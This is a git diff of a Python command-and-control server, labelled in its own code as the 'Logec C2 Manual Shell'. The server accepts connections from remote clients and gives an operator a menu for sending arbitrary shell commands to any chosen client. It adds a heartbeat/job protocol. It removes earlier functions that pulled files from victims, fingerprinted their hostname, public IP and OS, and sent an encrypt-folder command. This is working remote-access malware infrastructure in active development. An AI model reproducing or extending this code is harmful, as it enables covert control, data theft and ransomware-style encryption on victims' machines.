@@ -7,6 +7,7 @@ import subprocess as sp
 import socket
 import threading
 import time
+import os
 
 import random
 #import imports
@@ -32,26 +33,26 @@ class s_sock:
         
         self.server.listen()  
         
-        clients = {}
+        self.clients = {}
         
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
             self.conn, addr = self.server.accept()
-            print("~New Connection~")
+            ##print("~New Connection~")
             
             ## Getting client id from the client, and the IP address
-            ip_address = self.conn.getpeername()[0]
-            id = self.conn.recv(1024).decode()
+            self.ip_address = self.conn.getpeername()[0]
+            self.id = self.conn.recv(1024).decode()
             
             ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
             
-            client_name = "client_" + ip_address.replace(".", "_") + "_" + id
+            client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
             
             ## creating object intance
             client = s_perclient()
 
             # something dict
-            clients[client_name] = client
+            self.clients[client_name] = client
             
             ''' THis is what the dict looks like, each "name" is pointing at a class object
             clients = {
@@ -64,32 +65,12 @@ class s_sock:
             globals()[client_name] = client
             thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR))
 
-            thread.start()        
-    
-            # list all s_perclient instances by name
-            print("\n\n========Current Clients========")
-            for var_name in globals():
-                if var_name.startswith("client_"):
-                    print(var_name)
-            print("===============================\n\n")
-            
-        
-            ## Interacting with client (temporarily here)
-            ## dict 
-            client_name = input("Enter a client name: ")
-
-            # get the corresponding instance from the clients dictionary and call its method
-            if client_name in clients:
-                client_instance = clients[client_name]
-                client_instance.client_do()
-            else:
-                print(f"{client_name} not found.")
-            
-            
-            
-            #self.client_interact()
+            thread.start()                
             
     def client_interact(self):
+        ## This will be returned to the client later
+        print(" ===== Logec C2 Manual Shell +++++\n\n")
+        
         print("\n\n========Current Clients========")
         for var_name in globals():
             if var_name.startswith("client_"):
@@ -98,12 +79,19 @@ class s_sock:
         
         
         ## dict 
-        client_name = input("Enter a client name: ")
+        client_name = input("Enter a client name to interact, or 'refresh': ")
 
         # get the corresponding instance from the clients dictionary and call its method
-        if client_name in clients:
-            client_instance = clients[client_name]
-            client_instance.client_do()
+        if client_name in self.clients:
+            client_instance = self.clients[client_name]
+            
+            while True:
+                client_instance.local_decision_tree(input(f"Client (menu for options): [{self.ip_address}]: "))
+        
+        elif client_name.lower() == "refresh":
+            os.system("clear")
+            self.client_interact()
+            
         else:
             print(f"{client_name} not found.")
     
@@ -121,16 +109,40 @@ class s_perclient:
     
     ## Each thread runs this, which will handle the client appropriatly.
     def handle_client(self, conn, addr):
+        ## Need to hash out a standard protocol too, like who sends what etc
+        
+        # Basic Protocol. If everything obides by these, it should all work
+        '''
+        0) First connection, client sends clientID
+        0A) Server responds with ?? (maybe a confirmation)
+        
+        1) Client sends heartbeat/hello
+        2) Server recieves heartbeat. 
+        3) Server responds with job, if no job, client waits & closes the connection*
+            3a) If job, client stops heartbeat while doing job, then falls back to heartbeat
+            
+        4) Once wait time is up, steps 1-4 repeat
+        
+        *If no response is received, client also waits & continues with the heartbeat
+        
+        Final:
+        
+        On fail, the client should drop back to heartbeats.
+        
+        On server fail... Restart the "start_server" function after releasing the connection?
+        
+        '''
+        
         self.conn = conn
         self.addr = addr
         ## redundant of self.addr but easier to use
         self.ip = addr[0]
         self.port = addr[1]
         
-        print(self.conn, self.addr)
+        ##print(self.conn, self.addr)
         
         
-        print(f"New Connection from {conn.getpeername()}")
+        ##print(f"New Connection from {conn.getpeername()}")
         
         ## Listening for anythinf from the client
         while True:
@@ -143,37 +155,73 @@ class s_perclient:
                 break
             
             # Process the received message
-            self.decision_tree(received_msg)
+            #self.decision_tree(received_msg)
             
         # Close the connection when the loop is over
         conn.close()
         
         ## class needs to die when done
 
-    ## decision tree
-    def decision_tree(self, msg):
+    ## decision tree for remote/automated messages
+    def remote_decision_tree(self, msg):
         print(f"CLIENT SAYS: {msg}")
 
         if msg == "heartbeat":
             print("SERVER ACTION: client_do()")
             self.client_do()
+    
+    
+    ## decision tree for user/local commands, or from logec
+    def local_decision_tree(self, raw_cmd):
+        #print(f"USER SAYS: {cmd}")
+        
+        cmd = raw_cmd.lower()
+
+        ## Keeping connected while a user is interacting
+        self.current_job = "None"
+
+        if cmd == "shell":
+            print("SERVER ACTION: client_do()")
+            self.current_job = "shell"
+            self.client_do()
+            
+        elif cmd == "menu":
+            print("Jobs: ||\n1)shell \n2)debug\n")
+            
+        elif cmd == "status":
+            print("FAKE STATUS, may show 'waiting' in future showing its waiting")
+            
+        elif cmd == "debug":
+            print(f"{self.addr}")
+        
+        else:
+            print("Command not found")
         
     
-    def client_do(self):
-        print(f"CLIENT_DO {type(self).__name__}")
+    def client_do(self):        
+        if self.current_job == "None":
+            pass
         
-        ## Current job will be whatever the user wants to do... needs some thinking out on how to execute
-        #current_job = "wait"
-        current_job = "shell"
-        
-        if current_job == "wait":
+        elif self.current_job == "wait":
             self.send_msg("wait")
             #here the client heartbeat timer resets & it waits
         
-        elif current_job == "shell":
+        elif self.current_job == "shell":
+            ## Telling client that I want a shell
+            print("DEBUG: client_do sending shell")
+            self.send_msg("shell")
+            
             while True:
                 shellcommand = input("$: ") ## eventually this unput will be from a different connection (from logec client) for now its local
-                print(self.send_msg(shellcommand))
+                
+                if shellcommand == "_exit":
+                    print("placeholder exit")
+                    #conn.close()
+                    
+                else:
+                    print(self.send_msg(shellcommand))
+            #else:
+                #print("SHELL ERR")
         
         
     
@@ -187,92 +235,20 @@ class s_perclient:
         recieve_msg = self.conn.recv(1024).decode()
         
         return recieve_msg
-        '''recieve_msg = self.conn.recv(1024).decode() ## was 10000
-        
-        if recieve_msg == None:
-            print("ERR")
-            #self.conected = False
-        #else:
-            #self.decision_tree(recieve_msg)
-
-          ## why are you still encoded
-        print(f"Message: {recieve_msg}") 
-        return recieve_msg'''
-    
-    
-    def file_download(self, message): ## << message is the same as file in this case
-        import filetransfer_server as fts
-        
-        lst = []
-        
-        for i in message.split():
-            lst.append(i)
-            
-        print(lst)
-        
-        LISTEN_IP = lst[0]
-        LISTEN_PORT = lst[1]
-        SAVE_FILEPATH = lst[2]
-        FILE_TO_GET = lst[3]
-            
-        
-        #LISTEN_IP = "0.0.0.0"
-        #LISTEN_PORT = 5000
-        #SAVE_FILEPATH = file
-        
-        ## sending details TO THE LISTEN SERVER
-        ## needs to be in a thread to not block the lower from running
-        
-        server_recieve = threading.Thread(target=fts.s_recieve_file, args=(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH))
-        server_recieve.start()
-        
-        #fts.s_recieve_file(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH)
-        
-        ## Sending TO THE CLIENT
-        message = f"!_get {LISTEN_IP} {LISTEN_PORT} {FILE_TO_GET}" 
-        self.start_server.conn.send(message.encode()) ## sending to client to send the file
-        return True
-
-    def get_os(self):
-        message = "!_os-name"
-        self.start_server.conn.send(message.encode())
-        os_name_recieve = self.start_server.conn.recv(10000).decode()
-        return os_name_recieve
-
-    
-
-class s_action:
-    
-    def c_get_hostname(os):
-        if os == "nt":
-            return s_sock.send_msg(s_sock, windows_info.target.hostname())
-        else:
-            return s_sock.send_msg(s_sock, linux_info.target.hostname())
-    
-    def c_pub_ip(os):
-        if os == "nt":
-            return s_sock.send_msg(s_sock, windows_info.target.pub_ip())
-        else:
-            return s_sock.send_msg(s_sock, linux_info.target.pub_ip())
-            
-    
-    def c_os(os):
-        if os == "nt":
-            return s_sock.send_msg(s_sock, windows_info.target.os())
-        else:
-            return s_sock.send_msg(s_sock, linux_info.target.os())
-
-    
-    def encryptor(folder, extension, password):
-        s_sock.send_msg(s_sock, f"!_encrypt {folder} {extension} {password}")
 
 
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
-    SERV.start_server('0.0.0.0',8092)
-   #SERV.client_interact()
-    #while True:
+    
+    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',8095))
+
+    background_listen.start() 
+    
+    #SERV.start_server('0.0.0.0',8092)
+    
+    SERV.client_interact()
+
     
     '''while True:
         shellcommand = input("$: ")
